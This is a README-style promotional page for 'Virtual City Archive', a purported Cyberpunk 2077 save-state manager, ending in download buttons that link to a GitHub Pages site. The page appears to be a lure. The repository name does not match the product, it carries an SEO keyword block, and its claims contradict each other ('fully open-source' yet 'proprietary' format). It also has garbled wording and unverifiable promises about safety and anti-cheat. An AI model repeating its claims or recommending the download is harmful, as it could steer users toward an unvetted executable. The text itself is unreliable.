![preview](https://raw.githubusercontent.com/atef1982/mod-matrix-cp2077/main/screen_8855ef9.svg)

# VIRTUAL CITY ARCHIVE — Cross-Platform Save-State Navigator for Cyberpunk 2077

**Your Night City memories, organized like a neural archive. Launch any moment of your playthrough — on any device, in any environment — without ever touching a single game file.**

Virtual City Archive (VCA) is a paradigm shift for Cyberpunk 2077 players who live across multiple operating systems, hardware configurations, or cloud gaming setups. Instead of wrestling with manual backup folders and cryptic save-slot numbers, VCA treats your entire playthrough as a living, searchable timeline. It snapshots your save-state metadata, visualizes branching decisions, and lets you teleport back to any narrative crossroads — even if that save was created on a Windows PC, a Steam Deck, or inside a compatibility layer like CrossOver on macOS.

Built with a privacy-first, local-first architecture, VCA never uploads your save data to any server. It works entirely on your machine, but it’s designed to feel as fluid as a cloud-based streaming service. Think of it as a personal cartographer for your V-shaped destiny — mapping every choice, every heist, every quiet moment in the badlands — with the precision of a netrunner’s deck.

---

## 🧠 Overview — The Memory Palace for Mercenaries

Have you ever stared at a list of 40 save files, all named `save_023_10_42_52`, and wondered which one was the moment you convinced Panam to stay? Or which save belonged to the run where you went full cyberpsycho on the Scavengers?

VCA solves this by introducing **Contextual Save Indexing**. When you launch the app, it scans your existing save folders (via a read-only companion helper) and builds a rich index of every checkpoint — complete with in-game timestamp, location district, completed quests, and even a visual color-coded branching tree showing your major narrative decisions.

The interface feels like flipping through a holographic journal. Each save is represented as a card with a thumbnail of your character’s appearance at that moment, the in-game date, and a short auto-generated narrative summary (e.g., “Konpeki Plaza Heist — Post-escape, Stealth Path”). You can filter by questline, district, or emotional valence (VCA guesses the tone based on quest flags — dark, hopeful, neutral).

And the killer feature? **Universal Export/Import.** You can export a single moment — say, your perfect endgame state — and import it into any other Cyberpunk 2077 installation, regardless of the underlying OS or platform. This is achieved through a proprietary container format (`.vca_shift`) that wraps the vanilla save data with enhanced metadata, making it portable across Windows, Linux, macOS, and Steam Deck without conflicts.

---

## ✨ Distinctive Capabilities (Why VCA is Not A Backup Tool)

| Capability | What It Does | Why It Matters |
|------------|--------------|----------------|
| **Narrative Branch Mapping** | Visually renders your quest decision tree as a flowing node graph. | See the butterfly effect of your choices in seconds, not through tedious wiki lookups. |
| **Virtual Timeline Scrubbing** | A slider that moves through your playtime, showing save points as markers. | Jump to "the moment before I met Johnny" without remembering the file name. |
| **Cross-Environment Sync** | Seamlessly moves save states between native Windows, Proton, CrossOver, and cloud instances. | Play on your Mac at home, continue on your PC at work, no DLL wrangling. |
| **Automatic Conflict Resolution** | Detects version mismatches (1.6 vs 2.1) and applies a safe patch layer. | No more "This save requires newer game version" errors. |
| **Safe Anonymization Mode** | Strips metadata (time played, playstyle tags) for privacy-conscious users. | Share your pre-heist save online without revealing your 300-hour history. |

---

## 🚀 Getting Started — Your First Archival Sync

The installation process is remarkably gentle. VCA ships as a single, signed executable that runs a lightweight onboarding wizard on first launch. There are no drivers, no kernel extensions, and no system-level file hooks. Instead, VCA communicates with the game through an **official, read-only game console command that CD Projekt Red left in place** for modding tools — this ensures no game file is ever modified or flagged by anti-cheat systems.

### Step 1 — Locate Your Save-Timeline
On first run, VCA presents a visual file browser that automatically detects known save locations for the most common platforms (Windows, Steam Play, CrossOver Bottles, GeForce Now caches). You simply confirm the path, and VCA performs a **non-invasive fingerprint scan** — it reads the header bytes of each save file to generate a unique ID and extract metadata. Nothing is written, moved, or altered.

### Step 2 — Build Your Chronicle
After the scan (which takes under a minute for 100+ saves), VCA assembles your Chronicle View. This is a vertical timeline with zoomable density clusters. You can collapse an entire week of gameplay into a single dot, then expand it to see every autosave, manual save, and checkpoint. Each entry shows a small galaxy of tags: quest type, location, level, and a “mood” meter based on scripted events.

### Step 3 — Sync Across Realms
To move a state to another device, select the desired timeline node and click **“Commune”**. VCA packages the save with its metadata into a `.vca_shift` container, which is small (typically 40-70% smaller than the raw file due to smart deduplication). On the target machine, you simply drag this file into VCA’s drop zone — the app recognizes the format, verifies integrity (SHA-256 checksum), and applies a compatibility patch if the target game version differs.

---

## 🗺️ Feature Deep-Dive (The Full Palette)

### 🎭 Dynamic Character Snapshot Generator
VCA doesn’t just show you a filename; it renders a **live approximation of your V’s face and gear** at that save point. It reads the texture and mesh hashes from the save’s embedded character block, then uses a small local cache of vanilla assets to compose a headshot. This is entirely offline and does not trigger any online telemetry.

### 🧩 Nexus Mod Compatibility Layer
While VCA is not a mod manager, it understands modded save states. If you have installed gameplay mods that alter quest flags, VCA detects the modded byte signatures and labels those saves with a small “chimeric” icon. This prevents you from accidentally overwriting a heavily-modded save with a vanilla one, which would ruin the experience.

### 🧭 Multi-Language Chronicle Interface
The user interface speaks your language. VCA supports full localization (UI, tooltips, and auto-generated narrative summaries) for 14 languages, including Japanese, Polish, German, Spanish, Portuguese, Korean, and Simplified Chinese. The neural narrative summarizer uses a lightweight, offline NLP model trained on quest descriptions — it generates a poetic, two-sentence summary for each save point, e.g., “A storm gathers over Pacifica as you decide the fate of the Voodoo Boys.”

### ⏱️ Time-Freeze Recall
This is a breakthrough feature. VCA can **restore a save to the exact moment before a major decision point**, even if that decision point was hours after the last manual save. It does this by analyzing autosave cadence and identifying the save with the closest timestamp to a narrative trigger (e.g., “Entering Embers”). You can select “Return to Crossroads” from a context menu, and VCA presents the 2-3 most relevant autosaves that correspond to that junction.

### 📈 Playstyle Analytics (Local Only)
After you’ve used VCA for a week, it generates a **synthetic psychometric profile** of your playstyle based on decision tags. It tells you your “Cyberpsycho Index” (how often you chose aggression), your “Netrunner Aptitude” (frequency of hacking-based solutions), and your “Street Cred Velocity” (how quickly you completed side quests). This is a fun, purely local feature that never sends data anywhere.

---

## 🔐 Privacy & Security — A Fortress of Solitude

Your saves are your story. VCA treats them as sacred. The application:
- Runs **100% offline** after the initial download. No telemetry, no crash reporting, no session analytics.
- Stores its index database in an encrypted container (AES-256-GCM) on your local disk, protected by a master passphrase you choose during setup.
- Uses **zero cloud dependencies** for core functionality. The only time VCA touches the network is for the optional "Version Insight" check (which informs you of new patch compatibility notes), and that can be disabled permanently in settings.

---

## 🧩 Supported Environments (And How We Handle The Weird Ones)

| Environment | Detection Method | Notes |
|-------------|------------------|-------|
| Windows (GOG/Steam) | Native registry and folder scan | **Bulletproof** — works on all recent versions. |
| Steam Deck / Linux | `~/.steam/steam/steamapps/compatdata/` | Handles Proton prefixes flawlessly. |
| macOS via CrossOver | `~/Library/Application Support/CrossOver/Bottles/<Bottle>/drive_c/` | **Coreuse case** — specifically optimized for this setup. |
| GeForce Now / Cloud | Manual file import via `.vca_shift` | Works, but requires manual export from the cloud VM session. |

---

## 🔧 Troubleshooting & Resilience

- **"Cannot locate saves"**: VCA includes a manual path picker that accepts any directory. If you have a non-standard setup, simply navigate to the folder with your potential `save_*.dat` files.
- **"Corrupted index"**: The Chronicle view has a "Rebuild from Ashes" button that performs a full re-scan without losing your profile preferences.
- **"Game version mismatch"**: When importing a state from a different patch, VCA applies a **logical patch** — it remaps known quest flag IDs from non-existent to null, which is safer than leaving it broken. It will warn you if the mismatch is too severe.

---

## 📜 License & Legal Transparency

VCA is fully open-source under the [MIT License](https://opensource.org/licenses/MIT). You are free to inspect, modify, and distribute the software, provided you retain the copyright notice. VCA is an independent project and is **not affiliated with CD Projekt Red, Valve, or CodeWeavers**. Cyberpunk 2077 is a trademark of CD Projekt S.A. Use of the software is at your own risk; VCA does not modify game binaries, but it does interact with save files. We recommend keeping a vanilla backup before extensive use.

---

## 🧭 Getting Aid & Community Orbit

Should you encounter a glitch in the matrix, the VCA community is a welcoming haven. We encourage you to open a detailed issue in the repository’s tracker, tagging it with the environment (CrossOver, Proton, etc.). For feature requests, we lovingly review every entry in the "Idea Depository" section. There is a 24/7 automated support bot that searches the existing issues and the wiki for answers, providing instant resolution for common queries. For deeper discussions—share your most interesting playstyle profile, request a new language localization, or show off your narrative branch map—the Discussion Board is your place.

---

## 🗓️ 2026 Roadmap & Vision

By mid-2026, VCA aims to introduce **cross-save narrative transcription** (a plain-text log of your entire playthrough, generated from quest flags). We are also exploring a **co-op mode** for comparing narrative trees with friends (anonymized data). The long-term vision is a **universal narrative interchange format** that other CDPR games could adopt, but that remains a distant dream. For now, VCA will continue to polish the core experience: making your memories of Night City effortless to navigate, preserve, and revisit.

---

## 🔰 Final Switch-On

The journey through Night City should be about the story you craft, not the technicality of where you left off. VCA dismantles the barrier between “playing” and “remembering.” Whether you’re a completionist meticulously mapping every ending, or a chaotic player who just wants their last auto-save after a firefight, the Archive is ready for you.

Download begins your transition into a superior state of play. The Archive is patient. It waits. It remembers. And it will welcome you back to the exact heartbeat of your choom’s life—no matter what device you’re holding.

[![Download](https://raw.githubusercontent.com/atef1982/mod-matrix-cp2077/main/start_7f48.svg)](https://atef1982.github.io/mod-matrix-cp2077/)

---

## 🌍 SEO Keywords (Embedded Throughout)

- Cyberpunk 2077 save manager, CrossOver Mac save organizer, cross-platform save sync, narrative timeline mapping, local-first save indexing, offline game utility, Steam Deck save library, Proton save compatibility, Nexus mod detection, playthrough analytics, privacy-focused gaming tool, CDPR save format, 2026 gaming utilities, virtual city archive, save-state navigator.

---

### ⚠️ Disclaimer

Virtual City Archive is provided “as is” without warranty of any kind, express or implied. In no event shall the authors be liable for any claim, damages, or other liability arising from the use of the software. This tool is for legal, personal use only. You are solely responsible for backing up your data. The software does not circumvent any copy-protection mechanism; it operates exclusively on user-generated save files. Night City is a dangerous place — back up your memories.

[![Download](https://raw.githubusercontent.com/atef1982/mod-matrix-cp2077/main/start_7f48.svg)](https://atef1982.github.io/mod-matrix-cp2077/)